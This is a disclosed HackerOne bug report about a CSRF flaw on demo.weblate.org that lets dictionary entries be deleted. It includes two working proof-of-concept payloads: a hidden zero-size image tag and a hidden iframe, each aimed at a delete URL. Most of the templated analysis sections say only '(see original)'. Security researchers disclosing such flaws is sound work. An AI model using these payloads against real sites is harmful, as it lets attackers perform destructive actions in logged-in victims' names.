# CSRF bypass ( Delate Source Translation From dictionaries ) in demo.weblate.org

## Metadata
- **Source:** HackerOne
- **Report:** 230863 | https://hackerone.com/reports/230863
- **Submitted:** 2017-05-22
- **Reporter:** sup3r-b0y
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hello

I've Found CSRF in  https://demo.weblate.org
Sending a POST request  dictionaries  will delate successfully

steps to reproduce:

1.  go https://demo.weblate.org/ and login into your account
2.  now go https://demo.weblate.org/dictionaries/hello/sl/ 
3. add  new word, now delate it by CSRF

i made two exploit for attack

POC:

<img src="https://demo.weblate.org/delete-dictionaries/hello/sl/

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello

I've Found CSRF in  https://demo.weblate.org
Sending a POST request  dictionaries  will delate successfully

steps to reproduce:

1.  go https://demo.weblate.org/ and login into your account
2.  now go https://demo.weblate.org/dictionaries/hello/sl/ 
3. add  new word, now delate it by CSRF

i made two exploit for attack

POC:

<img src="https://demo.weblate.org/delete-dictionaries/hello/sl/5545/" width=0 height=0>


POC:

<!DOCTYPE html>
<html>
<body>
<iframe src="https://demo.weblate.org/delete-dictionaries/hello/sl/5545/" style="display:none;">
</iframe>
</body>
</html>

Just replace the delate id,  and try to delate

if you need more info please let me know!

be safe 

Thanks

</details>

---
*Analysed by Claude on 2026-05-24*
